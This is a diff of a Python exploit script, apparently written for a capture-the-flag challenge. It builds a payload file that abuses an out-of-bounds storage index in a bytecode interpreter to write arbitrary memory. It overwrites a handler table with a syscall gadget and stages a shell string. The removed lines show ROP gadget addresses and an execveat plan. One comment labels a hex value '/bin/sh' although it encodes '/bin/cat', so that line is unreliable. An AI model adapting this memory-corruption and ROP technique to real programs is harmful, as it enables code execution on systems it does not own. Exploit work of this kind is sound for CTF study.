@@ -17,10 +17,13 @@ DUM_RBP = 0x7fffffffd8d0
 DUM_RSP = 0x7ffffffd9eb0
 # these have fixed diff
 STORAGE_BASE = 0x7ffffffeaef0
+SOME_FLAG = STORAGE_BASE + 0x10028
 STACK_BASE   = STORAGE_BASE + 0x8000 + 0x1000 * 8
 HANDLER_TABLE_BASE = STACK_BASE + 0x6 * 8
 RET_ADDR = STORAGE_BASE - 69696
-
+RBP = STORAGE_BASE + 76256
+SOME_FLAG2 = RBP - 0x21a9
+SOME_FLAG3 = RBP - 0x29e0
 # construct /bin/perl /flag.txt
 
 def print_stack_length():
@@ -198,6 +201,16 @@ def write_at(addr, val):
     b += stack_to_storage()
     return b
 
+def write_at_without_load(addr):
+    """
+    write top of stack at addr 
+    """
+    b = b""
+    overflow_index = (addr - STORAGE_BASE) // 8
+    b += load_to_stack(overflow_index, signed=True)
+    b += stack_to_storage()
+    return b
+
 def read_at(addr):
     """
     read from addr to stack 
@@ -206,46 +219,20 @@ def read_at(addr):
     overflow_index = (addr - STORAGE_BASE) // 8
     b += load_to_stack(overflow_index, signed=True)
     b += read_from_storage()
-    b += dup_stack(0)  # duplicate for later use
     return b
 
 program = b""
+# program += write_at(SOME_FLAG, 0x1)  # set flag to 1
+# program += write_at(SOME_FLAG2, 0x0)  # set flag2 to 0
+# program += write_at(SOME_FLAG3, 0x1)  # set flag3
+program += load_to_stack(0xdeadbeefdeadbeef)
+program += p8(0x61)
 
+len_main = 0x2000
+program = program.ljust(len_main, b'\x00')
 
-"""
-Note to self:
-1. use execveat
-2. rsi = rdi and rdx = argv[]
-3. need to find a leak for rdx
-"""
+print(f"len main: {len_main}, content: {program.hex()[:64]}...")
 
-
-PREPARE_RDX = 0x101e9a3
-POP_RSI = 0x1025166
-POP_RCX = 0x1047944
-XOR_RDX = 0x1011076
-SYSCALL = 0x1040492
-
-program += write_at(HANDLER_TABLE_BASE + 10 * 8, SYSCALL)
-#program += write_at(RET_ADDR, 0)
-#program += write_at(RET_ADDR + 8, MAGIC_BEEF)  
-#program += write_at(RET_ADDR + 16, MAGIC_CAFE)  
-
-program += p8(10)
-len_main = len(program)
-
-print(f"len main: {len_main}")
-
-"""
-program += write_at(HANDLER_TABLE_BASE + 59 * 8, POPR14_ADDR)  
-program += write_at(RET_ADDR, 0)
-program += write_at(RET_ADDR + 8, POPR14_ADDR)  
-program += write_at(RET_ADDR + 16, SYSCALL_ADDR)  # r14
-program += write_at(RET_ADDR + 24, 0x7fffffffd8d0)  # rbp, filler
-program += write_at(RET_ADDR + 32, RSI_RESET_ADDR)  # ret to rsi = r8
-# program += write_at(RET_ADDR - 8, SYSCALL_ADDR)  # actual ret addr overwrite the last
-program += p8(59)
-"""
 
 # Payload construction
 with open('payload', 'wb') as f:
@@ -256,13 +243,15 @@ with open('payload', 'wb') as f:
     f.write(p32(0))
 
     # storage
-    f.write(p32(0))
-    # put /bin/sh in storage[0]
+    f.write(p32(2))
+    # put pointers in storage[0]
+    f.write(p64(0x7461632f6e69622f))  # "/bin/sh\x00"
+    f.write(p64(0x0000000000000000))  # filler
     
 
     # program
-    f.write(p32(len(program)))
-    f.write(program)
+    f.write(p32(len_main))
+    f.write(program) 
     f.flush()
   
 if args.run or args.delete:
